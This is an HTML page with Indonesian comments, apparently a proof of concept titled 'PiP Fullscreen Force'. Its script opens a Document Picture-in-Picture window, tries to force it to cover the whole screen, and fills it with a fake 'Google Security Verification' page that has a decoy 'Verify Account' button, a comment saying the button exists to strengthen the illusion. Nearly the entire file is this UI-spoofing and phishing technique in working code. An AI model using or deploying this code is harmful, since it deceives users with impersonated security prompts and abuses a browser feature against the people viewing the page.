<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PiP Fullscreen Force</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #f4f4f4; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
  .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; }
  h2 { color: #4285f4; margin-bottom: 10px; }
  p { color: #666; font-size: 14px; margin-bottom: 20px; }
  button { padding: 15px 30px; background: #1a73e8; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; }
  button:hover { background: #1557b0; }
  #status { margin-top: 20px; font-family: monospace; font-size: 12px; color: #666; }
</style>
</head>
<body>

<div class="panel" id="main-card">
  <h2>🔒 PiP Fullscreen Force</h2>
  <p>Klik tombol di bawah. PiP akan dipaksa masuk fullscreen dan menutupi seluruh layar.</p>
  <button id="startBtn">Force PiP Fullscreen</button>
  <div id="status">[*] Ready...</div>
</div>

<script>
(function () {
  'use strict';

  var btn = document.getElementById('startBtn');
  var statusEl = document.getElementById('status');

  function log(msg) {
    statusEl.textContent = msg;
    console.log("[PiP Fullscreen] " + msg);
  }

  // ============================================
  // 1. TRIGGER (KLIK)
  // ============================================
  btn.addEventListener('click', async function() {
    log("[*] Membuka PiP untuk fullscreen bypass...");

    try {
      if (!window.documentPictureInPicture) {
        alert("Document Picture-in-Picture tidak didukung.");
        return;
      }

      // ============================================
      // 2. BUKA PiP
      // ============================================
      const pipWindow = await documentPictureInPicture.requestWindow({
        width: 400,
        height: 300
      });

      log('PiP Window Opened. Size: ' + pipWindow.innerWidth + 'x' + pipWindow.innerHeight);

      // ============================================
      // 3. PAKSA FULLSCREEN (MULTIPLE METODE)
      // ============================================
      
      // A. Resize ke ukuran layar penuh
      try {
        pipWindow.resizeTo(screen.width, screen.height);
        log('Resized to screen: ' + screen.width + 'x' + screen.height);
      } catch (e) {
        log('Resize error: ' + e.message);
      }

      // B. Pindahkan ke posisi 0,0
      try {
        pipWindow.moveTo(0, 0);
      } catch (e) {}

      // C. Request Fullscreen API (pada elemen root PiP)
      try {
        const root = pipWindow.document.documentElement;
        if (root.requestFullscreen) {
          await root.requestFullscreen();
        } else if (root.webkitRequestFullscreen) {
          await root.webkitRequestFullscreen();
        } else if (root.mozRequestFullScreen) {
          await root.mozRequestFullScreen();
        }
        log('Fullscreen API requested.');
      } catch (e) {
        log('Fullscreen API ditolak: ' + e.message);
      }

      // ============================================
      // 4. TULIS KONTEN PiP (FULLSCREEN)
      // ============================================
      pipWindow.document.open();
      pipWindow.document.write(`
        <!DOCTYPE html>
        <html>
        <head>
          <meta charset="UTF-8">
          <title>Google Security Verification</title>
          <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
              font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
              background: #fff;
              display: flex;
              flex-direction: column;
              justify-content: center;
              align-items: center;
              min-height: 100vh;
              padding: 20px;
              text-align: center;
              overflow: hidden;
            }
            h3 { font-size: 28px; color: #333; margin-bottom: 10px; }
            p { font-size: 16px; color: #666; margin-bottom: 20px; }
            .info {
              font-family: monospace;
              font-size: 14px;
              color: #999;
              margin-top: 20px;
            }
            .fake-btn {
              padding: 15px 30px;
              background: #1a73e8;
              color: #fff;
              border: none;
              border-radius: 8px;
              font-size: 18px;
              font-weight: bold;
              cursor: pointer;
              margin-top: 20px;
            }
          </style>
        </head>
        <body>
          <h3>Google Security Verification</h3>
          <p>This PiP window is in fullscreen mode.</p>
          <div class="info" id="sizeInfo">Size: ${pipWindow.innerWidth}x${pipWindow.innerHeight}</div>
          <button class="fake-btn" id="fakeBtn">Verify Account</button>

          <script>
            (function() {
              var sizeInfo = document.getElementById('sizeInfo');
              function updateSize() {
                sizeInfo.textContent = 'Size: ' + window.innerWidth + 'x' + window.innerHeight;
              }
              window.addEventListener('resize', updateSize);
              updateSize();

              // Tombol palsu untuk memperkuat ilusi
              document.getElementById('fakeBtn').addEventListener('click', function() {
                alert('Verification Required. Please close this window manually.');
              });
            })();
          <\/script>
        </body>
        </html>
      `);
      pipWindow.document.close();

      log('PiP fullscreen bypass attempt completed.');

    } catch (e) {
      log('Error: ' + e.message);
    }
  }, { once: true });

})();
</script>

</body>
</html>
